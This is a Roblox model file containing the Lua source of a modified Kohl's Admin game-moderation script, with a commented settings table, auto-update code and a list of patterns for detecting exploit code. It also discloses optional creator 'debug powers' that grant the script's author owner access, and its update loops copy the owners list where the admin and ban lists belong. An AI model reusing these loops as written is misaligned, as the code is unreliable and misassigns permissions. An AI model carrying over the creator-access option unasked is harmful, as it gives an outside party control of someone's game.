<roblox xmlns:xmime="http://www.w3.org/2005/05/xmlmime" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://www.mulrbx.com/roblox.xsd" version="4">
	<External>null</External>
	<External>nil</External>
	<Item class="Script" referent="RBX95265AD07AC34F5D95AB22F44FF7527B">
		<Properties>
			<bool name="Disabled">false</bool>
			<Content name="LinkedSource"><null></null></Content>
			<string name="Name">new admin</string>
			<string name="ScriptGuid"></string>
			<ProtectedString name="Source"><![CDATA[----------------------------------------------------------------------------------------
--					   		Kohl's Admin [Epix Edition]								  --
----------------------------------------------------------------------------------------
--		 	guy5f fixed some garbage, added some garbage, and put this on finobe      --
--            albertlatin added and fixed some stuff so he's a pretty cool dude       --
--			                actual credits found on line 333						  --
----------------------------------------------------------------------------------------
local set={ -- Main Table, all functions and variables are kept in this, don't change.--
----------------------------------------------------------------------------------------





			--------------
			-- SETTINGS --
		    --------------
			
	------------------------------
	--  true=on  --  false=off  --
	------------------------------
	
	--------------------------------------------------------------------------------------------------------------
	-- Make sure you READ BEFORE YOU EDIT! Please do not ask me questions about settings before reading.        --
	-- Make sure there is a ; after each setting, as shown below!												--
	-- Extra Information is below the settings.																	--
	-- Don't change something without reading the comment next to it first, you could break something.			--
	-- If its in green, it means its a comment, don't edit it as it wont do anything.							--
	-- By default tools need to be in ServerStorage, not Lighting, change this by changing the Storage setting.	--
	-- btw it'll probably break if you do any shit w/ donors?? idk just dont touch it if it asks about marketplaceservice or donors or whatever --
	--------------------------------------------------------------------------------------------------------------
	
	--------------------------
	--  Important Settings  --
	--------------------------
	
	['ChangedSettingsStick'] = false; --Do settings you change in-game save? (this includes bans, admins, etc etc)
	
	['SettingsToIgnore'] = {}; --Place settings to ignore here
	
	['DataStoreKey'] = "Kohl's Admin [Epix Edition][JK$KJh3]"; --Datastore key
	
	['Storage'] = game:service('ServerStorage'); --Set this to where you store things (such as tools) game:service('ServerStorage') is recommended as it does not replicate to clients. Use services, if you use things like game.Lighting it will break if Lighting is renamed.
	
	--------------
	--  Trello  --
	--------------
	
	['Trello'] = false; --Pulls Bans/Admins from a Trello board every set number of seconds on every server of everygame this script is in (that has Http enabled and uses the same BoardID)
	
	['BoardID'] = '9HH6BEX2'; --Trello board ID, its in the URL of your board: https://trello.com/b/9HH6BEX2/epix-incorporated-synced-ban-list - The id for this board is 9HH6BEX2 (by default uses our exploiter ban list.)
	
	['HttpWait'] = 10; --How often (in seconds) should the list(s) update? Recommended 10+ to avoid HttpService problems
	
		--[[
		You NEED to enable HttpEnabled in order for this to work! To enable it follow the below instructions:
		Run this following command in the command bar as shown in the screenshot: game:service('HttpService').HttpEnabled=true print('Enabled Http')
		Screen shot: http://prntscr.com/46uztz
		
		How to set up your own multi-game list for your games:
		
		Below instructions are for bans but can also be applied to admin lists,
		refer to "To use this for synced admin lists" under the instructions for admin lists info. 
		
		By default the Trello settings are set to use our ban list of exploiters, but you may 
		want to change it so that you can set up and control your own multi-game, autoupdating 
		list(s). So now I am going to tell you how to do that.
		
		1. Enable Http, refer to a few lines up to learn how to easily and quickly do that.
		2. Make a Trello account (or sign in with google)
			-Go to http://trello.com, click "Log in with Google" or "Sign up-It's Free" and do the account making stuff it tells you to
		3. After you sign up/log in you need to make a new board, click the + then click "New Board..." - http://prntscr.com/46v2fq
		4. Give your board a name and click the "Change..." next to "This board will be private" and make sure you make the board public! - http://prntscr.com/46v4bf
		5. Change one of the lists titles to "Ban List" In the screenshot I accidentally typed "cards" instead of "lists" - http://prntscr.com/46v5af
		6. Add people to the bans by clicking "Add a card..." and then typing their username as the title, username:userid, or if its a group Group: groupname:groupid - http://prntscr.com/46v74e
		7. Now you need to just set BoardID to your board's ID, refer to http://prntscr.com/46v74e for this, or refer to the comment next to the BoardID setting
		8. You are done, just configure the BoardID and enable Http in each of your games and your multigame banlist is done, confure your board however you want as long as you leave the "Ban List" list that contains name and keep the board public so the script can read it!
		Use our site for reference: https://trello.com/b/9HH6BEX2/epix-incorporated-synced-ban-list
		
		To use this for synced admin lists, simply repeat the above steps replacing Ban List with
		Admin List, TempAdmin List, or Owner List, anyone added to these list will appear in
		the admin list with [Synced] next to their name, they will not be able to be unadmined.
		Admin lists do not yet support Group: NAME:ID however they do support Username:ID format.
		--]]
	
	---------------------
	--      Tables     --
	---------------------
	
	['Owners'] = {'Previous','Player1','Ifar','Enderman', 'trolebus',"bamar"}; -- Are able to set Admins who can ban/etc... using :pa name, format is "USERNAME" or "USERNAME=USERID"
	
	['Admins'] = {}; -- Sets Admins who can use ban/kick/admin or shutdown, format is "USERNAME" or "USERNAME=USERID"
	
	['TempAdmins'] = {}; -- Sets Admins who can't use ban/kick/admin or shutdown, format is "USERNAME" or "USERNAME=USERID"
	
	['BanList'] = {}; -- Add people to ban here. Format to use UserId is "Name=UserId" EX: "John32=192845", this bans any player named John32 or has an id of 192845 (This way they can't bypass the ban by changing their username) use $group=GROUPID to ban groups.
	
	['MuteList'] = {}; -- Add the names of people to mute (makes it so they cant talk)
	
	------------------------------
	--  Prefix/Split/Key Binds  --
	------------------------------
	
	['Prefix'] = ";"; -- This comes before each admin command (:kill kohl)
	
	['AnyPrefix'] = ";"; -- This comes before each player command (commands that can be run by anyone, !rejoin, !ping, etc)
	
	['SpecialPrefix'] = ""; -- Prefix to use with special functions (!admin,!nonadmins,!all,!others,!random) By default this is now set to nothing to avoid confusion.
	
	['SplitKey'] = " "; -- This is what seperates command arguments eg: player raiders in :team player raiders
	
	['BatchSplit'] = "/"; --This seperates arguments of the batch command (":batch kill bob/fire me Bright blue/fling kohl")
	
	['ConsoleKey'] = "'"; --Key that opens the console, default is '
	
	['CustomKeyBinds'] = true; -- Allow players and admins set personal key binds?
	
	----------------------
	--  Basic Settings  --
	----------------------
	
	['Console'] = false; --Determines if the script's console can be used or not
	
	['AutoUpdate'] = false; -- Automatically get the newest version? Potentially buggy. Unsupported
	
	['FunCommands'] = true; -- Set to false if you don't want any fun commands (For Strict Places)
	
	['HelpSystem'] = false; -- Enable the Help System? (!help command)
	
	['ChatLog'] = true; -- Log all chats for the server? 
	
	['MaxNumberOfLogs'] = 5000; -- How many logs to keep until the oldest entries are removed (MAX is 5000)
	
	['JoinMessage'] = false; -- Display a message with player info when a player joins, set group id in group settings if you want it to display if a player is in a group or not and if so what rank they are.
	
	['DonorPerks'] = false; -- Sets if donors are allowed to show off that they donated, when people donate in your place you get 10% of what they payed!
	
	['PermBanKey'] = '0.49971007415998'; -- Key (Random String) to use in persistent perm ban (change if you perm banned someone by accident, make it 100% random, if you want a random key generator, put print(math.random()) into the command bar in studio and hit enter, then just copy what it gives you in the output window)
	
	['FreeAdmin'] = false; -- Set to true if you want everyone to get the set type of admin (not recommended)
	
	['FreeAdminType'] = 'TempAdmin'; -- Type of admin for FreeAdmin (TempAdmin/Admin/Owner)
	
	['AutoClean'] = false; -- AutoClean the server? (!clean)
	
	['AutoCleanDelay'] = 60; -- How long to wait between AutoCleans (in seconds)
	
	['PlayerCommands'] = true; -- Sets whether or not nonadmins can use player commands (!rejoin,!ping,!cmds,etc)
	
	['OwnersAreTrueOwners'] = true; -- This indicates whether or not Owners are considered True Owners, if set to true Owners get the same commands as the place owner (permban and other true owner cmds)
	
	['PMUsableByAnyone'] = false; -- Set this to true if you want it so anyone can use the PM command
	
	['AdminsSpawnWithGuis'] = false; -- This determines if admins spawn with the admin chat and cmd box, note the admin chat is disabled when custom chat is enabled (has a admin mode)
	
	['HelpGui'] = false; --This determines if players spawn with the helpgui or not
	
	['UpdateShutdown'] = false; --Automatically shutdown the game if it was updated
	
	['MusicList'] = {}; -- Add music to this table using the format: {Name='ExampleSong',Id=1234567} so that the table would look like local MusicList={{Name='ExampleSong',Id=1234567};{Name='ExampleSong2',Id=1234568}}, if you want to add pitch/volume simply insert Pitch and/or Volume EX: {Name='ExampleSong2',Id=1234568,Pitch=2,Volume=0.5}
	
	['CustomChat'] = false; --Custom chat system, aside from chat modes and various other things, the custom chat cannot be muted by exploiters and exploiters can not use it to run chat commands.
	
	['CustomChatType'] = 'Both'; --Classic/Bubbles/Both, Determines chat mode, simular to ROBLOX's chat settings.
	
	['SeparatedChannels'] = false; --Determines if the custom chat modes can see eachother, if set to true, for example, anyone whose chat is set to "Team" won't see chats from "Global"
	
	['CustomPlayerList'] = false; --A very basic and simplistic playerlist that I do not plan to spend much time on, it shows names colored by team color, has a menu for each name (click the name) and does not yet show leader stats, not finished and plan to update in the future.
	
	['MessageOfTheDay'] = false; --Determines if the Message of the Day is shown to admins on-join, you can set your own decal/model to use with the message of the day below, you simply place the message into its description after you set its ID
	
	['MessageOfTheDayID'] = 166040615; --ID Of model/decal to grab the message of the day from (needs to be set as the decal/model's description)
	
	['BuggedCommandMatching'] = false; --Set to true if you want to use the old buggy string matching that let you do things like "Hello :kill me" (really you could always set the prefix to something like "Hello " so you can do "Hello kill me")
	
	['VoteKick'] = false; --Enable player vote kicking?
	
	['VoteKickPercentage'] = '80'; --Vote percentage of players in-game needed to kick a player
	
	['CommandComfirmation'] = false; --Tell the user that the command successfully ran?
	
	['CommandBlackList'] = {}; --Add commands that you want to make place owner only (makes it so only the place owner is allowed to use the commands in this list)
	
	---------------------
	--  Anti-Exploit   --
	---------------------

	['ExclusionList'] = {}; -- Add the names of people you want to exclude from the AntiExploit to this list, note that admins are already excluded
	
	['ExploitAlert'] = false; --Alerts admins when someone goes nil/chats something thought to be exploit related, this is likely no longer going to work as the anti nil will disconnect a player as they are leaving to make sure they are not lingering in the nil/causing problems. Only notified if the first kick failed.
	
	['AntiChatCode'] = false; -- Prevents non-admins from running code/commands via chat (Add new things to detect into the WordList table)
	
	['Detection'] = false; -- Will attempt to detect certain exploits
	
	['AntiRobloxLocked'] = false; --  Disconnects any player who is or becomes RobloxLocked. (Recommended you keem this enabled, if a player joins RobloxLocked they will not be hooked by the script, this removes them before they break something.)
	
	['AntiNewAccount'] = false; -- Prevents accounts under the set age from joining.
	
	['MinimumAge'] = 100; -- Age a player must be above (in days) if AntiNewAge is enabled.
	
	['AntiSpeed'] = false; -- Trys to stop speed "hackers"
	
	['AntiGui'] = false; -- Prevents non-game/admin guis from being spawned on players, such as the account stealing gui
	
	['AntiSelection'] = false; -- Crashes a player if their selection changes (so if they are using studio tools like drag, move, resize, etc)
	
	['AntiNil'] = false; -- Crashes/Kicks any non-admins who attempt to go "nil"
	
	['AntiCheatEngine'] = false;-- Kicks a player if a Cheat Engine installation is detected on their computer, not 100%
	
	['AntiScriptsDisabled'] = false; -- If the client script cannot be loaded onto the player or takes to long to check in the player is kicked
	
	['AntiAnimation'] = false; -- Prevents animation exploit
	
	['AntiNameIdChange'] = false; -- Attempts to stop players from locally changing their name/id to fool local scripts
	
	['AntiGod'] = false; -- Prevents non-admins from being godded
	
	['AntiLeak'] = false; -- Makes it a little harder for people to steal your game [BE WARNED, This can possibly ruin personal servers]
	
	['RenameGameObjects'] = false; -- Renames things like Lighting, Players, and Workspace, will break most scripts that are not coded to work in such situations and confuse most people using badly coded explorers or studio.
	
	['NerfExplosions'] = false; -- Makes it so any explosions get nerfed, meaning they wont do any damage.
	
	['AntiDecals'] = false; -- Prevents decals from being added to Workspace, really though you should just use FilteringEnabled ;p
	
	['AntiSound'] = false; -- Prevents sounds not made by this script from getting inserted into Workspace.
	
	['WordList'] = {}; -- Add kick words to this list, will kick a player if they say something on the list, works with string patterns.
	
	['AllowedGuiList'] = {}; 
		--If there is a gui in your game that is not in startergui 
		--then add its name to this table, do note that if the 
		--name of the gui is just ScreenGui or something like 
		--that, if a hacker inserts a gui with the same name 
		--it will not be removed, so make sure you make the name 
		--of the gui very specific.
	
	---------------------
	-- Group Settings  --
	---------------------
	
	['GroupRanks'] = false; -- If group members matching the ranks in "Ranks" are given admin/banned (depending on what you set)
	
	['GroupOnlyJoin'] = false; -- Makes it so ONLY people in the set group can join the game.
	
	['GroupId'] = 0; -- Id of group, used for info/join message, if set will display a user's rank when the info command is used on them.
	
	['Ranks'] = {};--[[SET ['GroupRanks'] TO TRUE TO USE!
		Add ranks to have admin/be banned format is {Group=GROUPID,Rank=RANKNAME/NUMBER,Type=ADMINTYPE}; 
		GROUPID is the ID of the group the rank belongs to and that the player must be in
		RANKNAME/NUMBER is either the name of the rank (Generals) or its number (252) if you want to admin rank 252 and every rank above it, simply set it to negative, so Rank=-252 will admin anyone in rank 252 and up
		ADMINTYPE is the type of admin players in the rank will get, this can be Temp, Admin, Owner, or Banned
		In the end your table should look something like this (THIS IS AN EXAMPLE TABLE, DO NOT USE IT): 
		['Ranks'] = {{Group=124324,Rank=142,Type='Temp'},{Group=1932348,Rank='Generals',Type='Owner'},{Group=1284124,Rank=-193,Type='Admin'},{Group=1399424,Rank=-1,Type='Banned'}};
	--]]
	
	---------------------
	--    VIP Admin    --
	---------------------
	
	['VipAdmin'] = false; -- If someone can have admin for owning an item
	
	['VipItems'] = {}; --Add VIP items here, format is {Item=ID,Type="Admin"}, so for example ['VipItems'] = {{Item=193945,Type="TempAdmin"},{Item=125263,Type="Admin"}}
	
	['FriendAdmin'] = false; -- Set to true if you want people on your friendlist to have admin
	
	['FriendAdminType'] = 'TempAdmin'; -- Type of admin friends will get if "FriendAdmin" is enabled
	
	---------------------
	--  GUI Settings   --
	---------------------
	
	['PrimaryColor'] = Color3.new(0,0,0); -- Primary GUI Color (Default black) (Remember, each 1 translates to a 255, keep that in mind when changing colors, use things like 124/255 to get the color you want)
	
	['SecondaryColor'] = Color3.new(1,1,1); -- Secondary GUI Color (Default white)
	
	['Font'] = 'Arial'; -- Text Font, can only be fonts usable on roblox (Arial, ArialBold, Legacy, SourceSans, SourceSansBold)
	
	['TextColor'] = Color3.new(1,1,1); -- Text Color (Default white)
	
	['TextStrokeTransparency'] = 0; -- Text Stroke Transparency (0-1)
	
	['TextStrokeColor'] = Color3.new(0,0,0); -- Color of the text stroke around letters (Default black)
	
	['Transparency'] = 0.5; -- GUI Transparency (0-1)
	
	['Animations'] = true; -- Determines if to animate stuff or not
	
	['MessageAnimations'] = true; -- Same as above but specifically for messages (the ones that cover the entire screen)
	
	------------------------------------------------------
	--					END OF SETTINGS					--
	------------------------------------------------------
}
	---------------------
	--    IMPORTANT    --
	---------------------
	--[[
		For AutoUpdate to work this script's model needs to be in your inventory,
		if you got the script from anywhere other than my models the AutoUpdate
		will not work due to ROBLOX security nonsense. You can find the model
		here: http://www.mulrbx.com/Kohls-Admin-Epix-Edit-item?id=145629584
		
		For information about LoadStringEnabled please refer to the following:
		
		http://wiki.mulrbx.com/index.php?title=Security#LoadStringEnabled
		http://wiki.mulrbx.com/index.php?title=Points_tutorial#Restrictions
		
		If you want to use the :s command you will need to set LoadStringEnabled
		to true. It can be found by going into studio, opening the explorer and properties
		windows, clicking on ServerScriptService and under properties checking
		LoadStringEnabled. Loadstring is only used in the script for Output and
		the scripting command. The script will function fine without it. Currently
		:ls and :cs are unusable due to updates that removed loadstring() abilities
		from the client, meaning no more local script building in-game.
		------------------------------------------------------------------------
		IF THERE ARE NEW SETTINGS YOU WILL NEED TO MANUALLY UPDATE THE SCRIPT TO
		CHANGE THEM, THEY WILL OTHERWISE BE LEFT AS THE DEFAULT. (Unless you use :settings)
		------------------------------------------------------------------------
		Please carefully read each setting's description BEFORE changing something
		as you could break something if you set something the wrong way.
		------------------------------------------------------------------------
		Find A security flaw or bug? 
		Know of a way to detect an exploit or make the AntiExploit better?
		Think of a way to make the script better? 
		Send me a message!
		
	---------------------
	-- DISCLAIMER/INFO --
	---------------------
		Credit: 
		
		-Kohltastrophe (Scripth) for the original script this was based on and for sharing
		some of his ideas and commands, and his continued help and support
		
		-Sceleratis for this version of Kohl's Admin
		
		-einsteinK for the original SBL older versions used and his help with some things, legit best scripter I know.
		
		-Arlikas for testing nearly anything I ask him to
		
		-GigsD4X and the F3X team for the F3X tool, full credit to them. I only made it into a hopperbin for this script.
		
		-Everyone who helped me with testing, and suggested new ideas, features, and commands.
		
		I in no way claim to have made Kohl's Admin Commands, I have only
		made this version of it.
		
		If you have any questions, need help, or want to contact me you can send 
		me a Private Message on the main website (mulrbx.com) via my profile ("Send Message"
		under my avatar/character picture.)
		
		If you want to support the real Kohltastrophe put the following on your profile:
		"Scripth is the real Kohltastrophe. Put this on your profile so people know."
		
		Say what you will about this script, the original was a turning point for all 
		admin scripts, you can say "ew" all you want but it won't change that. If you can
		make something better then please go right ahead. I have chosen to continue the development
		of Kohl's Admin mostly as a hobby. If you are going to complain about something that is not a bug
		then please, at least get your information in order before you do. Blind critism helps no one.
	
		There is nothing hidden, I have place owner powers in your game, however
		they are fully optional and only used for debugging the script. 
		I would never force you to use anything, so you can optionally remove these 
		abilities by setting the following setting to false:																			]]
		set.CreatorDebugPowers=false															--[[
		Its completely your choice. I will still try to help you whether you disable 
		this or not, just know that it may make things more difficult and time consuming. 
		If you know what you are doing then feel free to disable this as you probably 
		won't need it anyway. The common situations people need help for are
		misconfigured setting, place owner powers are needed so I can view errors and 
		info that is in the server log (:debuglogs) and usually view/fix settings (:settings)		
	]]
	---------------------
	-- Tips and Tricks --
	---------------------
	--[[
		
			:kill me,noob1,noob2,!random,%raiders,$123456,!nonadmins
			-- kills you, noob1, noob2, a random person, team raiders, people in group 123456, and nonadmins.
			You can also run silent commands using /e, for example:
			"/e :kill kohl" Do not that this will still show up in logs.
			*Note, by silent I just mean people won't see you chat it, it however will still show up in logs.
			
		You can also use a variety commands for different people;
			 all -- Everyone in the server
			 others -- Everyone but you
			 me -- You
			 admins -- Admins in the server
			 nonadmins -- People who are not admins in the server
			 random -- A random person, this can include you.
			 %TEAMNAME -- Ex: :kill %raiders will kill everyone in team Raiders.
			 $GROUPID -- Let you kill anyone in a specific group, if an id is not given it will use the GroupId setting.
			 -PLAYERNAME -- Lets you exclude players from commands, :kill !all,-kohl will kill everyone but kohl
			
		If you want to add cameras to your game (like saved into your game so you don't need to use the admin script to spawn them every new server)
		then just make a camera, needs to be a single part, so a sphere, brick, what ever it may be, make sure its anchored and locked
		just simply position it where you want in workspace, then make its name Camera: NAMEHERE
		so for example: Camera: Cam1
		the name is very important as the script will look for it in workspace when the game starts.
		make sure you name each camera something diffierent. You can preset waypoints the same way, just use Waypoint: instead of Camera:
		
		MESSAGES/HINTS FOR OTHER SCRIPTS:
		If you would like to have the hints/messages from this script usable in other SERVER (not local)
		scripts, then simply put the follow at the top of your script,
		
		message=_G['Message']
		hint=_G['Hint']
		
		USAGE EXAMPLES: 
		hint(msg,playerstable) - message(title,msg,playerstable)
		
		(Do note that playerstable needs to be a table containing players NOT player names! 
		Use game:service('Players'):children() to send a message to everyone.)
		
		hint('Hello people',game:service('Players'):children())  <=== sends "Hello people" to all players in game
		hint('Heyo montano',{game:service('Players').Sceleratis}) <=== Sends "Heyo montano" to the player Sceleratis
		message('Server Message','Hello people',game:service('Players'):children())  <=== Makes a message with the title "Server Message" and a message of "Hello people"
		message('Message from swagyguy','Heyo celary man',{game:service('Players').Sceleratis}) <=== Works the same as above but only the player Sceleratis sees it
		
	--]]

--__________________________________________________________________________________--
--__________________________________________________________________________________--																					--
--__________________________________________________________________________________--
--__________________________________________________________________________________--
--																					--

--------------------------------------------------------------------------------------
--##################################################################################--

--##[ WARNING: Changing anything below could result errors and break the script! ]##--

--##################################################################################--

--#############[ DO NOT MODIFY UNLESS YOU KNOW WHAT YOU ARE DOING! ]################--

--#################[ I WILL NOT HELP YOU IF YOU BREAK SOMETHING! ]##################--

--##################################################################################--
--------------------------------------------------------------------------------------

--__________________________________________________________________________________--
--__________________________________________________________________________________--																					--
--__________________________________________________________________________________--
--__________________________________________________________________________________--
--																					--																			--

--[ Script specific functions ]-
local print=function(...) for i,v in pairs({...}) do print(script.Name..' - '..tostring(v)) end end
local Pcall=function(func,...) local function cour(...) coroutine.resume(coroutine.create(func),...) end local ran,error=ypcall(cour,...) if error then print('Error: '..error) end end
--[ Grab Updatable ]--
local DataStore local UpdatableSettings={} for i,v in pairs(set) do if i~='DataStoreKey' and i~='ChangedSettingsStick' and i~='CreatorDebugPowers' and i~='Storage' then table.insert(UpdatableSettings,i) end end
coroutine.wrap(function() repeat wait() until game:GetService("DataStoreService") DataStore = game:GetService("DataStoreService"):GetDataStore(set.DataStoreKey) if set.ChangedSettingsStick and game.CreatorId>0 then repeat wait() until DataStore for imp,ves in pairs(UpdatableSettings) do local run=true for k,m in pairs(set.SettingsToIgnore) do if m and v==m then run=false end end if DataStore:GetAsync(ves)~=nil and run then set[ves]=DataStore:GetAsync(ves) end end end end)()
--[ Main Script Function ]--
set.Debug=false --!Debug!hold
set.MainScriptFunction=function()
set.Print=print
script.Parent=game:service('ServerScriptService')
--game:GetService("InsertService"):LoadAsset(67651).van.Parent = script["Script Dependencies"]
if not script:FindFirstChild("Version") then
print ("No version found, please reinsert the script.") return end
for _,v in pairs (script.Parent:GetChildren()) do
if v.Name == "KAED" and v.ClassName == "StringValue" then
for _,s in pairs (v:GetChildren()) do
if s.Value == "owner" then
table.insert(set.Owners, s.Name)
end
if s.Value == "admin" then
table.insert(set.Admins, s.Name)
end
if s.Value == "temp" then
table.insert(set.TempAdmins, s.Name)
end
if s.Value == "ban" then
table.insert(set.BanList, s.Name)
end
if s.Name == "prefix" then
set.Prefix = s.Value
end
if s.Name == "specialprefix" then
set.SpecialPrefix = s.Value
end
v:Destroy()
print "Succesfully updated"
end
end
end
if set['AutoUpdate'] then
if script:FindFirstChild("Version") then
print ("Version Found. Current Version: "..script.Version.Value)
local ins = game:GetService("InsertService")
local ke = ins:LoadAsset(44666)
ke.Name = "currentscript"
local kae = ke["Kohl's Admin [Epix Edition]"]
kae.Disabled = true
if kae.Version.Value < script.Version.Value then
print "what the fuck" 
ke:Destroy() 
elseif kae.Version.Value == script.Version.Value then
print "The script is updated."
ke:Destroy() 
elseif kae.Version.Value > script.Version.Value then
print "Outdated version" 
if set['AutoUpdate'] and not script.Parent:FindFirstChild("KAED") then
if not ins:FindFirstChild("currentscript") then
local ke = ins:LoadAsset(44666)
ke.Name = "currentscript"
local kae = ke["Kohl's Admin [Epix Edition]"]
end
local kl = Instance.new("StringValue", script.Parent)
kl.Name = "KAED"
for i = 1, #set.Owners do
local uw = set.Owners[i]
local mbw = Instance.new("StringValue", kl)
mbw.Name = uw
mbw.Value = "owner"
end 
for i = 1, #set.Admins do
local uw = set.Owners[i]
local mbw = Instance.new("StringValue", kl)
mbw.Name = uw
mbw.Value = "admin"
end 
for i = 1, #set.TempAdmins do
local uw = set.Owners[i]
local mbw = Instance.new("StringValue", kl)
mbw.Name = uw
mbw.Value = "temp"
end 
for i = 1, #set.BanList do
local uw = set.Owners[i]
local mbw = Instance.new("StringValue", kl)
mbw.Name = uw
mbw.Value = "ban"
end
 
local mbw = Instance.new("StringValue", kl)
mbw.Name = "prefix"
mbw.Value = set.Prefix

local mbw = Instance.new("StringValue", kl)
mbw.Name = "specialprefix"
mbw.Value = set.SpecialPrefix
kae.Parent = script.Parent
kae.Disabled = false
wait()
script:Destroy()
end
end
end
end
local depholder=script:FindFirstChild('Script Dependencies')
if not depholder then error('Script Dependencies not found!') end
local deps={} for i,v in pairs(depholder:children()) do deps[v.Name]=v end
set.OrigLightingSettings = {
	abt = game:service('Lighting').Ambient,
	oabt = game:service('Lighting').OutdoorAmbient, 
	brt = game:service('Lighting').Brightness, 
	time = game:service('Lighting').TimeOfDay, 
	fclr = game:service('Lighting').FogColor, 
	fe = game:service('Lighting').FogEnd, 
	fs = game:service('Lighting').FogStart,
	gs = game:service('Lighting').GlobalShadows,
	ol = game:service('Lighting').Outlines,
sc = game:service('Lighting').ShadowColor}
if game.CreatorId<=0 or game.PlaceId<=0 then set.UpdateShutdown=false end
set.objects = {}
set.needhelp={}
set.adminchats={}
set.cameras = {}
set.MapBackup = Instance.new('SpawnLocation')
set.JailedTools={}
set.NewClients = {}
set.Changelog = require(deps['Change Log'])
set.donors={}
set.contans={}
set.PluginEvents={}
set.PluginEvents.Chat={}
set.PluginEvents.PlayerJoined={}
set.PluginEvents.CharacterAdded={}
set.bl = {}
set.al = {}
set.tal = {}
set.oal = {}
set.VoteKickVotes={}
set.PlayerLogs={} 
set.PlayerLogs.Chat={}
set.PlayerLogs.Admin={}
set.PlayerLogs.Exploit={}
set.canuseloadstring=false
set.donorgamepass={157092510,159549976}
set.BTacId = {9999999*2}
set.RemoteName=string.char(math.random(1,255))
set.RemoteClientKey=string.char(math.random(1,255))
set.RemoteObject=string.char(math.random(1,255))
set.RemoteServerKey=string.char(math.random(1,255))
set.GuiName=string.char(math.random(1,255))
set.RandiSpeed=tostring(60.5+math.random(9e8)/9e8)
set.version = script.Version.Value
set.NTacId = {1237666}
set.HelpRequest={}
set.Response={}
set.Commands={}
set.OpenVote={}
set.Waypoints={}
set.slock = false
set.lighttask = false
set.dlastupdate='Not Updated Yet'
set.ScriptAntiWordList={
	'inject[%S]',
	'getitem[^%s]',
	'workspace%.[^%s^%.]',
	'[^%s^%w]ban [%w]',
	'ban[^%s^%w][%w]',
	'crash[^%s^%w][%w]',
	'[^%s^%w]crash [%w]',
	'[^%s^%w]kick [%w]',
	'kick[^%s^%w][%w]',
	':SetCoreGuiEnabled',
	'GetObjects',
	':GetChildren',
	':children()',
	'in pairs(',
	'script%.Parent',
	'game%.Workspace',
	'game:service',
	':GetService',
	'game%.Debris',
	'game%.Lighting',
	'game%.Players',
	'loadstring(',
	'InsertService',
	':LoadAsset',
	'FindFirstChild',
	'while (.*) do',
	'Instance.new'
}
set.ScriptMusicList={
{n='habits',id=182402191};
{n='skeletons',id=174270407};
{n='russianmen',id=173038059};
{n='heybrother',id=143786134};
{n='loseyourself',id=153480949};
{n='diamonds',id=142533681};
{n='happy',id=146952916};
{n='clinteastwood',id=148649589};
{n='freedom',id=130760592};
{n='seatbelt',id=135625718};
{n='tempest',id=135554032};
{n="focus",id=136786547};
{n="azylio",id=137603138};
{n="caramell",id=2303479};
{n="epic",id=27697743};
{n="rick",id=2027611};
{n="crystallize",id=143929751};
{n="halo",id=1034065};
{n="pokemon",id=1372261};
{n="cursed",id=1372257};
{n="extreme",id=11420933};
{n="harlemshake",id=142468820};
{n="tacos",id=142295308};
{n="wakemeup",id=147632133};
{n="awaken",id=27697277};
{n="alone",id=27697392};
{n="mario",id=1280470};
{n="choir",id=1372258};
{n="chrono",id=1280463};
{n="dotr",id=11420922};
{n="entertain",id=27697267};
{n="fantasy",id=1280473};
{n="final",id=1280414};
{n="emblem",id=1372259};
{n="flight",id=27697719};
{n="banjo",id=27697298};
{n="gothic",id=27697743};
{n="hiphop",id=27697735};
{n="intro",id=27697707};
{n="mule",id=1077604};
{n="film",id=27697713};
{n="nezz",id=8610025};
{n="angel",id=1372260};
{n="resist",id=27697234};
{n="schala",id=5985787};
{n="organ",id=11231513};
{n="tunnel",id=9650822};
{n="spanish",id=5982975};
{n="venom",id=1372262};
{n="wind",id=1015394};
{n="guitar",id=5986151};
{n="selfie1",id=148321914};
{n="selfie2",id=151029303};
{n="fareast",id=148999977};
{n="ontopoftheworld",id=142838705};
{n="mashup",id=143994035};
{n="getlucky",id=142677206};
{n="dragonborn",id=150015506};
{n="craveyou",id=142397454};
{n="weapon",id=142400410};
{n="derezzed",id=142402620};
{n="burn",id=142594142};
{n="workhardplayhard",id=144721295};
{n="royals",id=144662895};
{n="pompeii",id=144635805};
{n="powerglove",id=152324067};
{n="pompeiiremix",id=153519026};
{n="sceptics",id=153251489};
{n="pianoremix",id=142407859};
{n="antidote",id=145579822};
{n="takeawalk",id=142473248};
{n="countingstars",id=142282722};
{n="turndownforwhat",id=143959455};
{n="overtime",id=145111795};
{n="fluffyunicorns",id=141444871};
{n="gaspedal",id=142489916};
{n="bangarang",id=142291921};
{n="talkdirty",id=148952593};
{n="bad",id=155444244};
{n="demons",id=142282614};
{n="roar",id=148728760};
{n="letitgo",id=142343490};
{n="finalcountdown",id=142859512};
{n="tsunami",id=152775066};
{n="animals",id=142370129};
{n="partysignals",id=155779549};
{n="finalcountdownremix",id=145162750};
{n="mambo",id=144018440};
{n="stereolove",id=142318819};
{n='minecraftorchestral',id=148900687}}
set.quotes={
	'"Every man has his secret sorrows which the world knows not; and often times we call a man cold when he is only sad." -Henry Wadsworth Longfellow';
	'"I came, I saw, I conquered." - Julius Ceasar';
	'"Our greatest glory is not in never falling, but in rising every time we fall." - Confucius';
	'"History will be kind for me for I intend to write it." - Winston Churchill';
	'"If you are neutral in situations of injustice, you have chosen the side of the oppressor. If an elephant has its foot on the tail of a mouse and you say that you are neutral, the mouse will not appreciate your neutrality." - Desmond Tutu';
	'"History is a relentless master. It has no present, only the past rushing into the future. To try to hold fast is to be swept aside." - John F. Kennedy';
	'"Those who do not remember the past are condemned to repeat it." - George Santayana';
	'"A pint of sweat, saves a gallon of blood." - George S. Patton';
	'"This is one small step for a man, one giant leap for mankind." - Neil Armstrong';
	'"History is the version of past events that people have decided to agree upon." - Napoleon Bonaparte';
	'"To see the world, things dangerous to come to, to see behind walls, to draw closer, to find each other and to feel. That is the purpose of life." - Life Motto Secret Life of Walter Mitty';
	[["Beautiful things don't seek attention" - Sean O'Connell in The Secret Life of Walter Mitty]];
	'"The only thing we have to fear is fear itself" - Franklin D. Roosevelt';
	'"Even if I knew that tomorrow the world would go to pieces, I would still plant my apple tree." - Martin Luther';
	'"Thousands of candles can be lighted from a single candle, and the life of the candle will not be shortened. Happiness never decreases by being shared." - Buddha';
	[["We can't help everyone, but everyone and help someone." - Ronald Reagan]];
	'"Our greatest weakness lies in giving up. The most certain way to succeed is always to try just one more time." - Thomas A. Edison';
	[["Even if you fall on your face, you're still moving forward." - Victor Kiam]];
	'"Strive not to be a success, but rather to be of value." - Albert Einstein';
